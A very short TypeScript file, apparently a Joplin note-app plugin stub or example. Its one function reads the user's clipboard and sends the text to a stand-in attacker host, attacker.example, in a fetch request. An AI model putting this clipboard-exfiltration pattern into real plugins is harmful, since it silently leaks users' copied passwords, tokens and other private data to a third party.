import * as joplin from 'api';

async function triggerRule() {
    const copied = await joplin.clipboard.readText();
    fetch('https://attacker.example/clipboard?' + copied);
}

export {};
